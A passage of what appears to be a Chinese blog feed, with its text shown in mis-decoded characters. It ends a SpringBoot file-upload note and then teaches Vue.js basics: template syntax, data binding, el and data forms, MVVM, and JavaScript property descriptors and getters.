/></li><li><p>æ‰€ä»¥åªè¦ç»™å®ƒä¸€ä¸ªç»å¯¹è·¯å¾„å°±å¯ä»¥äº†</p></li><li><p><code>file.transferTo(new File(dir.getAbsolutePath() +File.separator+ fileName));</code></p><p><code>dir.getAbsolutePath()</code> å¾—åˆ°å‚¨å­˜æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„</p><p><code>File.separator</code> å°±æ˜¯   <strong>&#x2F;</strong></p><p><code>fileName</code> ä½ è¦å­˜å‚¨çš„æ–‡ä»¶å</p></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringBoot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>å°é—®é¢˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue_Basic_learning</title>
    <link href="/2022/11/24/vue_Basic_learning/"/>
    <url>/2022/11/24/vue_Basic_learning/</url>
    
    <content type="html"><![CDATA[<h1 id="1-vueåŸºç¡€çŸ¥è¯†å’ŒåŸç†"><a href="#1-vueåŸºç¡€çŸ¥è¯†å’ŒåŸç†" class="headerlink" title="1. vueåŸºç¡€çŸ¥è¯†å’ŒåŸç†"></a>1. vueåŸºç¡€çŸ¥è¯†å’ŒåŸç†</h1><h2 id="1-1-åˆè¯†Vue"><a href="#1-1-åˆè¯†Vue" class="headerlink" title="1.1 åˆè¯†Vue"></a>1.1 åˆè¯†Vue</h2><ul><li>æƒ³è®©Vueå·¥ä½œï¼Œå°±å¿…é¡»åˆ›å»ºä¸€ä¸ªVueå®ä¾‹ï¼Œä¸”è¦ä¼ å…¥ä¸€ä¸ªé…ç½®å¯¹è±¡</li><li>demoå®¹å™¨é‡Œçš„ä»£ç ä¾ç„¶ç¬¦åˆhtmlè§„èŒƒï¼Œåªä¸è¿‡æ··å…¥äº†ä¸€äº›ç‰¹æ®Šçš„Vueè¯­æ³•</li><li>demoå®¹å™¨é‡Œçš„ä»£ç è¢«ç§°ä¸ºã€Vueæ¨¡æ¿ã€‘</li><li>Vueå®ä¾‹å’Œå®¹å™¨æ˜¯ä¸€ä¸€å¯¹åº”çš„</li><li>çœŸå®å¼€å‘ä¸­åªæœ‰ä¸€ä¸ªVueå®ä¾‹ï¼Œå¹¶ä¸”ä¼šé…åˆç€ç»„ä»¶ä¸€èµ·ä½¿ç”¨</li><li><code>&#123;&#123;xxx&#125;&#125;</code>æ˜¯Vueçš„è¯­æ³•ï¼šæ’å€¼è¡¨è¾¾å¼ï¼Œ<code>&#123;&#123;xxx&#125;&#125;</code>å¯ä»¥è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§</li><li>ä¸€æ—¦dataä¸­çš„æ•°æ®å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆé¡µé¢ä¸­ç”¨åˆ°è¯¥æ•°æ®çš„åœ°æ–¹ä¹Ÿä¼šè‡ªåŠ¨æ›´æ–°(Vueå®ç°çš„å“åº”å¼)</li></ul><blockquote><p>åˆå§‹ç¤ºä¾‹ä»£ç </p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨ --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Helloï¼Œ&#123;&#123;name.toUpperCase()&#125;&#125;ï¼Œ&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">//é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚</span></span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-comment">//åˆ›å»ºVueå®ä¾‹</span></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#demo&#x27;</span>, <span class="hljs-comment">//elç”¨äºæŒ‡å®šå½“å‰Vueå®ä¾‹ä¸ºå“ªä¸ªå®¹å™¨æœåŠ¡ï¼Œå€¼é€šå¸¸ä¸ºcssé€‰æ‹©å™¨å­—ç¬¦ä¸²ã€‚</span></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123; <span class="hljs-comment">//dataä¸­ç”¨äºå­˜å‚¨æ•°æ®ï¼Œæ•°æ®ä¾›elæ‰€æŒ‡å®šçš„å®¹å™¨å»ä½¿ç”¨ï¼Œå€¼æˆ‘ä»¬æš‚æ—¶å…ˆå†™æˆä¸€ä¸ªå¯¹è±¡ã€‚</span></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;hello,world&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;åŒ—äº¬&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="1-2-æ¨¡æ¿è¯­æ³•"><a href="#1-2-æ¨¡æ¿è¯­æ³•" class="headerlink" title="1.2 æ¨¡æ¿è¯­æ³•"></a>1.2 æ¨¡æ¿è¯­æ³•</h2><p>Vueæ¨¡æ¿è¯­æ³•æœ‰2å¤§ç±»:</p><ul><li>æ’å€¼è¯­æ³•ï¼š</li></ul><p>åŠŸèƒ½ï¼šç”¨äºè§£ææ ‡ç­¾ä½“å†…å®¹</p><p>å†™æ³•ï¼š<code>&#123;&#123;xxx&#125;&#125;</code>ï¼Œxxxæ˜¯jsè¡¨è¾¾å¼ï¼Œä¸”å¯ä»¥ç›´æ¥è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§</p><ul><li>æŒ‡ä»¤è¯­æ³•:</li></ul><p>åŠŸèƒ½ï¼šç”¨äºè§£ææ ‡ç­¾ï¼ˆåŒ…æ‹¬ï¼šæ ‡ç­¾å±æ€§ã€æ ‡ç­¾ä½“å†…å®¹ã€ç»‘å®šäº‹ä»¶â€¦ï¼‰</p><p>ä¸¾ä¾‹ï¼šv-bind:href&#x3D;â€œxxxâ€ æˆ– ç®€å†™ä¸º :href&#x3D;â€œxxxâ€ï¼ŒxxxåŒæ ·è¦å†™jsè¡¨è¾¾å¼ï¼Œä¸”å¯ä»¥ç›´æ¥è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;root&quot;</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æ’å€¼è¯­æ³•<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½ å¥½ï¼Œ&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æŒ‡ä»¤è¯­æ³•<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br>    &lt;!-- è¿™é‡Œæ˜¯å±•ç¤ºè¢«<span class="hljs-title class_">Vue</span>æŒ‡ä»¤ç»‘å®šçš„å±æ€§ï¼Œå¼•å·å†…å†™çš„æ˜¯jsè¡¨è¾¾å¼ --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;school.url.toUpperCase()&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span>ç‚¹æˆ‘å»&#123;&#123;school.name&#125;&#125;å­¦ä¹ 1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;school.url&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span>ç‚¹æˆ‘å»&#123;&#123;school.name&#125;&#125;å­¦ä¹ 2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">school</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;ç™¾åº¦&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;)</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="1-3-æ•°æ®ç»‘å®š"><a href="#1-3-æ•°æ®ç»‘å®š" class="headerlink" title="1.3 æ•°æ®ç»‘å®š"></a>1.3 æ•°æ®ç»‘å®š</h2><p>Vueä¸­æœ‰2ç§æ•°æ®ç»‘å®šçš„æ–¹å¼ï¼š</p><ul><li><p>å•å‘ç»‘å®š(v-bind)ï¼šæ•°æ®åªèƒ½ä»dataæµå‘é¡µé¢</p></li><li><p>åŒå‘ç»‘å®š(v-model)ï¼šæ•°æ®ä¸ä»…èƒ½ä»dataæµå‘é¡µé¢ï¼Œè¿˜å¯ä»¥ä»é¡µé¢æµå‘data</p><blockquote><p>tips:</p></blockquote><ol><li><p>åŒå‘ç»‘å®šä¸€èˆ¬éƒ½åº”ç”¨åœ¨è¡¨å•ç±»å…ƒç´ ä¸Šï¼ˆå¦‚ï¼šinputã€selectç­‰ï¼‰</p></li><li><p>v-model:value å¯ä»¥ç®€å†™ä¸º v-modelï¼Œå› ä¸ºv-modelé»˜è®¤æ”¶é›†çš„å°±æ˜¯valueå€¼</p></li></ol></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;root&quot;</span>&gt;<br>&lt;!-- æ™®é€šå†™æ³• å•å‘æ•°æ®ç»‘å®š --&gt;<br>    å•å‘æ•°æ®ç»‘å®šï¼š&lt;input type=<span class="hljs-string">&quot;text&quot;</span> v-<span class="hljs-attr">bind</span>:value=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>    åŒå‘æ•°æ®ç»‘å®šï¼š&lt;input type=<span class="hljs-string">&quot;text&quot;</span> v-<span class="hljs-attr">model</span>:value=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>    <br>    &lt;!-- ç®€å†™ v-<span class="hljs-attr">model</span>:value å¯ä»¥ç®€å†™ä¸º v-modelï¼Œå› ä¸ºv-modelé»˜è®¤æ”¶é›†çš„å°±æ˜¯valueå€¼--&gt;<br>    å•å‘æ•°æ®ç»‘å®šï¼š&lt;input type=<span class="hljs-string">&quot;text&quot;</span> :value=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>    åŒå‘æ•°æ®ç»‘å®šï¼š&lt;input type=<span class="hljs-string">&quot;text&quot;</span> v-model=<span class="hljs-string">&quot;name&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;)</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="1-4-elä¸dataçš„ä¸¤ç§å†™æ³•"><a href="#1-4-elä¸dataçš„ä¸¤ç§å†™æ³•" class="headerlink" title="1.4 elä¸dataçš„ä¸¤ç§å†™æ³•"></a>1.4 elä¸dataçš„ä¸¤ç§å†™æ³•</h2><p>elæœ‰2ç§å†™æ³•</p><ul><li><p>new Vueæ—¶å€™é…ç½®elå±æ€§</p></li><li><p>å…ˆåˆ›å»ºVueå®ä¾‹ï¼Œéšåå†é€šè¿‡vm.$mount(â€˜#rootâ€™)æŒ‡å®šelçš„å€¼</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>   <span class="hljs-comment">// ç¬¬ä¸€ç§ </span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br><span class="hljs-attr">data</span>:&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,<br>        &#125;<br>&#125;)<br>    <br>    <span class="hljs-comment">// ç¬¬äºŒç§</span><br>    vm.$mount(<span class="hljs-string">&#x27;#root&#x27;</span>)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>dataæœ‰2ç§å†™æ³•</p><ul><li><p>å¯¹è±¡å¼</p></li><li><p>å‡½æ•°å¼</p><p>ä¸å¯ä»¥ä½¿ç”¨<a href="https://blog.csdn.net/weixin_45112114/article/details/123358639?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166830462716800184149271%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166830462716800184149271&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123358639-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v2&utm_term=js%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">ç®­å¤´å‡½æ•°</a>ï¼Œä½¿ç”¨ç®­å¤´å‡½æ•°è°ƒç”¨å¯¹è±¡å°±å˜æˆäº†<code>Window</code></p></li></ul><blockquote><p>åœ¨ç»„ä»¶ä¸­ï¼Œdataå¿…é¡»ä½¿ç”¨å‡½æ•°å¼ã€‚ä½¿ç”¨å¯¹è±¡å¼å°±ç›¸å½“äºè®¾ç½®ä¸ºé™æ€å˜é‡ã€‚</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>        <span class="hljs-comment">// ç¬¬ä¸€ç§</span><br><span class="hljs-attr">data</span>:&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;jack&#x27;</span>,<br>        &#125;<br>        <br>        <span class="hljs-comment">// ç¬¬äºŒç§</span><br>        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;jack&#x27;</span><br>            &#125;<br>    &#125;<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="1-5-Vueä¸­çš„MVVM"><a href="#1-5-Vueä¸­çš„MVVM" class="headerlink" title="1.5 Vueä¸­çš„MVVM"></a>1.5 Vueä¸­çš„MVVM</h2><ul><li><p>Mï¼šæ¨¡å‹(Model) ï¼šdataä¸­çš„æ•°æ®</p></li><li><p>Vï¼šè§†å›¾(View) ï¼šæ¨¡æ¿ä»£ç </p></li><li><p>VMï¼šè§†å›¾æ¨¡å‹(ViewModel)ï¼šVueå®ä¾‹</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221112115435610.png" alt="image-20221112115435610"></p></li></ul><h2 id="1-6-æ•°æ®ä»£ç†"><a href="#1-6-æ•°æ®ä»£ç†" class="headerlink" title="1.6 æ•°æ®ä»£ç†"></a>1.6 æ•°æ®ä»£ç†</h2><blockquote><p>äº†è§£æ•°æ®ä»£ç†éœ€è¦jsçš„ä¸€äº›çŸ¥è¯†ï¼šObject.defineProperty()ï¼Œå±æ€§æ ‡å¿—ï¼Œå±æ€§æè¿°ç¬¦ï¼Œgetterï¼Œsetterã€‚ã€‚ã€‚</p></blockquote><p>å»ºè®®å­¦ä¹ æ–‡ç« åœ°å€ï¼š</p><p><a href="https://zh.javascript.info/property-descriptors">https://zh.javascript.info/property-descriptors</a></p><p><a href="https://zh.javascript.info/property-accessors">https://zh.javascript.info/property-accessors</a></p><p>è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼š</p><p><strong>å±æ€§æ ‡å¿—</strong> :</p><p>å¯¹è±¡å±æ€§ï¼ˆpropertiesï¼‰ï¼Œé™¤ <strong><code>value</code></strong> å¤–ï¼Œè¿˜æœ‰ä¸‰ä¸ªç‰¹æ®Šçš„ç‰¹æ€§ï¼ˆattributesï¼‰ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œæ ‡å¿—â€</p><ul><li><strong><code>writable</code></strong> â€” å¦‚æœä¸º <code>true</code>ï¼Œåˆ™å€¼å¯ä»¥è¢«ä¿®æ”¹ï¼Œå¦åˆ™å®ƒæ˜¯åªå¯è¯»çš„</li><li><strong><code>enumerable</code></strong> â€” å¦‚æœä¸º <code>true</code>ï¼Œåˆ™è¡¨ç¤ºæ˜¯å¯ä»¥éå†çš„ï¼Œå¯ä»¥åœ¨forâ€¦ .in Object.keys()ä¸­éå†å‡ºæ¥</li><li><strong><code>configurable</code></strong> â€” å¦‚æœä¸º <code>true</code>ï¼Œåˆ™æ­¤å±æ€§å¯ä»¥è¢«åˆ é™¤ï¼Œè¿™äº›ç‰¹æ€§ä¹Ÿå¯ä»¥è¢«ä¿®æ”¹ï¼Œå¦åˆ™ä¸å¯ä»¥</li></ul><p><strong>Object.getOwnPropertyDescriptor(obj, propertyName)</strong></p><blockquote><p>è¿™ä¸ªæ–¹æ³•æ˜¯æŸ¥è¯¢æœ‰å…³å±æ€§çš„å®Œæ•´ä¿¡æ¯ objæ˜¯å¯¹è±¡ï¼Œ propertyNameæ˜¯å±æ€§å</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> user = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;John&quot;</span><br>&#125;;<br><br><span class="hljs-keyword">let</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(user, <span class="hljs-string">&#x27;name&#x27;</span>);<br> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(descriptor)<br>   <br>    <span class="hljs-comment">/* å±æ€§æè¿°ç¬¦ï¼š</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      &quot;value&quot;: &quot;John&quot;,</span><br><span class="hljs-comment">      &quot;writable&quot;: true,</span><br><span class="hljs-comment">      &quot;enumerable&quot;: true,</span><br><span class="hljs-comment">     &quot;configurable&quot;: true</span><br><span class="hljs-comment">   &#125;    */</span><br></code></pre></td></tr></table></figure><blockquote><p>æ‰“å°ç»“æœ</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/09b4bf67bb7843388fecd7da1572901f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>Object.defineProperty</strong> (obj, prop, descriptor)</p><blockquote><p>objï¼šè¦å®šä¹‰å±æ€§çš„å¯¹è±¡ã€‚</p><p>propï¼šè¦å®šä¹‰æˆ–ä¿®æ”¹çš„å±æ€§çš„åç§°</p><p>descriptorï¼šè¦å®šä¹‰æˆ–ä¿®æ”¹çš„å±æ€§æè¿°ç¬¦</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> user = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;John&quot;</span><br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(user, <span class="hljs-string">&quot;name&quot;</span>, &#123;<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br>user.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Pete&quot;</span>;<br><br><span class="hljs-comment">// æ‰“å°åè¿˜æ˜¯æ˜¾ç¤º &#x27;John&#x27;,æ— æ³•ä¿®æ”¹nameå€¼</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„å±æ€§æ ‡å¿—å°±ä¸æ¼”ç¤ºäº†ï¼Œæ¥ä¸‹æ¥çœ‹é‡ç‚¹ï¼šè®¿é—®å™¨å±æ€§ã€‚</p><p><strong>è®¿é—®å™¨å±æ€§ ï¼š</strong></p><p>æœ¬è´¨ä¸Šæ˜¯ç”¨äºè·å–å’Œè®¾ç½®å€¼çš„å‡½æ•°ï¼Œä½†ä»å¤–éƒ¨ä»£ç æ¥çœ‹å°±åƒå¸¸è§„å±æ€§ã€‚</p><p>è®¿é—®å™¨å±æ€§ç”± â€œgetterâ€ å’Œ â€œsetterâ€ æ–¹æ³•è¡¨ç¤ºã€‚åœ¨å¯¹è±¡å­—é¢é‡ä¸­ï¼Œå®ƒä»¬ç”¨ <code>get</code> å’Œ <code>set</code> è¡¨ç¤ºï¼š</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-keyword">get</span> <span class="hljs-title function_">name</span>() &#123;<br>        <span class="hljs-comment">// å½“è¯»å– obj.propName æ—¶ï¼Œgetter èµ·ä½œç”¨</span><br>    &#125;,<br>    <span class="hljs-keyword">set</span> <span class="hljs-title function_">name</span>() &#123;<br>        <span class="hljs-comment">// å½“æ‰§è¡Œ obj.name = value æ“ä½œæ—¶ï¼Œsetter èµ·ä½œç”¨</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æ›´å¤æ‚ä¸€ç‚¹çš„ä½¿ç”¨</strong></p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> user = &#123;<br><span class="hljs-attr">surname</span>: <span class="hljs-string">&#x27;gao&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;han&#x27;</span><br>    <br>    <span class="hljs-keyword">get</span> <span class="hljs-title function_">fullName</span>() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">surname</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">fullName</span>)<br><br></code></pre></td></tr></table></figure><p>ä»å¤–è¡¨çœ‹ï¼Œè®¿é—®å™¨å±æ€§çœ‹èµ·æ¥å°±åƒä¸€ä¸ªæ™®é€šå±æ€§ã€‚è¿™å°±æ˜¯è®¿é—®å™¨å±æ€§çš„è®¾è®¡æ€æƒ³ã€‚æˆ‘ä»¬ä¸ä»¥å‡½æ•°çš„æ–¹å¼ <strong>è°ƒç”¨</strong> <code>user.fullName</code>ï¼Œæˆ‘ä»¬æ­£å¸¸<strong>è¯»å–</strong> å®ƒï¼šgetter åœ¨å¹•åè¿è¡Œã€‚</p><blockquote><p>vueçš„è®¡ç®—å±æ€§çš„åº•å±‚æ„é€ æ„Ÿè§‰ç”¨åˆ°äº†è¿™ç§æ€æƒ³ï¼Œæˆ‘ç›®å‰è¿˜æ²¡çœ‹è¿‡æºç ï¼Œæ˜¯è¿™æ ·çŒœæƒ³çš„ã€‚</p></blockquote><p>æˆªè‡³ç›®å‰ï¼Œ<code>fullName</code> åªæœ‰ä¸€ä¸ª getterã€‚å¦‚æœæˆ‘ä»¬å°è¯•èµ‹å€¼æ“ä½œ 